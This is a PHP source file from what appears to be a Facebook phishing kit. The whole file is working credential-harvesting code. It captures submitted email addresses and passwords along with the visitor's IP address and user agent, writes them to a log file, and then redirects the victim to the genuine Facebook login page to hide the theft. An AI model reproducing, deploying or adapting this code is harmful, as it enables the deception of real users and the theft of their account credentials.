<?php
error_reporting(0);
session_start();

include "scam_config.php";
include "utils.php";
CheckFile($log_file);

if ($_SERVER['REQUEST_METHOD'] == 'POST') {
    if (array_key_exists('email', $_POST) && array_key_exists('pass', $_POST)) {
        if(!empty($_POST["email"]) && !empty($_POST["pass"])) {
            $data = $_POST["email"] . ":" . $_POST["pass"] . ":" . $ip_address = $_SERVER['REMOTE_ADDR'] .":" . $user_agent . PHP_EOL;
            $_SESSION["login_data"] = $data;
            $_SESSION["email"] = $_POST["email"];
            WriteToLog($log_file,$data);
            $_SESSION["error"] = 0;
            header('Content-Type: text/html; charset=utf-8');
            header('Location: https://www.facebook.com/login.php?login_attempt=1&lwv=100&email=' . $_POST["email"]);
            exit;
        }
    }
}
$_SESSION["error"] = 1;
header('Location: index.php?li=A330WfROj-y1uVgUAGgv06Dh&e=1348029&refid=8&refsrc=https%3A%2F%2Fwww.facebook.com%2F&_rdr');
exit;
?>